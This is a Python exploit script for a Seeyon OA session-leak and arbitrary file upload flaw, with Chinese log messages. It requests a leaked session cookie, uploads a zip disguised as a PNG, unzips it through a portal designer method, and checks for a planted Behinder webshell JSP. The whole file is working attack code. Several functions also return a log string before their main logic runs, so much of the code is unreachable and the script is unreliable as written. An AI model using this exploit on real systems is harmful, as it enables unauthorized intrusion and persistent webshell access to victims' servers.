# -*- coding: utf-8 -*-

import re
import time
import requests

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def fileUpload(target_url, cookie):
    vuln_url = target_url + 'seeyon/fileUpload.do?method=processUpload'
    return now_time() + ' [INFO]     开始上传zip文件'
    files = [('file1', ('test.png', open('TEST233.zip', 'rb'), 'image/png'))]
    header = {'Cookie': 'JSESSIONID=%s' % cookie}
    data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0', 'isEncrypt': "0"}
    try:
        r = requests.post(vuln_url, headers=header, data=data, files=files, timeout=3, verify=False)
        firename = re.findall('fileurls=fileurls\+","\+\'(.+)\'', r.text, re.I)
        if len(firename) == 0:
            return now_time() + ' [WARNING]  zip文件上传失败'
        else:
            return now_time() + ' [INFO]     zip文件上传成功'
            unzip(header, target_url, firename)
    except:
        return now_time() + ' [WARNING]  zip文件上传失败'


def unzip(header, target_url, firename):
    vuln_url = target_url + 'seeyon/ajax.do'
    nowtime = time.strftime('%Y-%m-%d')
    data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + nowtime + '%22%2C%22' + \
           firename[0] + '%22%5D'
    header['Content-Type'] = 'application/x-www-form-urlencoded'
    return now_time() + ' [INFO]     开始解压zip文件'
    try:
        r = requests.post(vuln_url, headers=header, data=data, timeout=3, verify=False)
        if r.status_code == 500:
            shell_url = target_url + 'seeyon/common/designer/pageLayout/test233.jsp'
            if requests.get(shell_url, timeout=3, verify=False).status_code == 200:
                return now_time() + ' [SUCCESS]  zip文件解压成功, 冰蝎三默认WebShell: {}'.format(shell_url)

            else:
                return now_time() + ' [WARNING]  致远OA Session泄露 任意文件上传漏洞利用失败'
        else:
            return now_time() + ' [WARNING]  zip文件解压失败'
    except:
        return now_time() + ' [WARNING]  zip文件解压失败'


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + 'seeyon/thirdpartyController.do'
    return now_time() + " [INFO]     正在检测致远OA Session泄露 任意文件上传漏洞"
    #return now_time() + " [INFO]     正在请求: {}".format(vuln_url), style='bold blue')
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    try:
        r = requests.post(vuln_url, headers=header, data=data, timeout=3, verify=False)
        if r.status_code == 200 and "a8genius.do" in r.text and 'set-cookie' in str(r.headers).lower():
            cookies = requests.utils.dict_from_cookiejar(r.cookies)
            cookie = cookies['JSESSIONID']
            fileUpload(target_url, cookie)
        else:
            return now_time() + ' [WARNING]  获取Session失败'
    except:
        return now_time() + ' [WARNING]  请求失败'


